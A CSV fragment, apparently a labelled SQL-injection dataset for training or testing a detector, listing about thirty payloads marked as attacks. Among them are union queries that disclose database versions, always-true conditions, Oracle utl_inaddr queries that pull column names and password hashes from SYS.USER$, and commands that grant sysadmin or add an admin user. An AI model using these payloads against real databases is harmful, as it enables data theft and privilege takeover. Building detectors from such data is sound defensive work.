row_index,payload_norm,label,sqli_type_hint
480,password:*/ = 1--,1,
481,"select * from users where id = 1 <@. union select 1,version ( ) -- 1",1,
482,"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1,
483,"select * from users where id = '1' union select @ @1,version ( ) -- 1'",1,
484,"union ( select NULL, ( select @@version ) ) --",1,
485,"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1,
486,"select * from users where id = 1.<@. union select 1,version ( ) -- 1",1,
487,"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1,
488,"select * from users where id = 1 + @<@. union select 1,version ( ) -- 1",1,
489,"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1,
490,"select * from users where id = 1 or ( $+ ) = 1 union select 1,@@VERSION -- 1",1,
491,"select * from users where id = 1 + ( \+ ) union select null,@@VERSION -- 1",1,
492,"select * from users where id = 1. union select null,version ( ) -- 1",1,
493,"select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1,
494,"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1,
495,AND 1 = utl_inaddr.get_host_address ( ( SELECT banner FROM v$version WHERE ROWNUM = 1 ) ) AND 'i' = 'i,1,
496,select * from users where id = 1 <@$_ or 1 = 1 -- 1,1,
497,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,
498,"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1,
499,"select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1,
500,"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1,
501,"select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1,
502,UNION SELECT,1,
503,asc,1,
504,"|| myappadmin.adduser ( 'admin', 'newpass' ) || '",1,
505,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,
506,"select * from users where id = 1 or ( \ ) = 1 union select 1,@@VERSION -- 1",1,
507,) or true--,1,
508,"select * from users where id = 1 + ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1,
509,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,
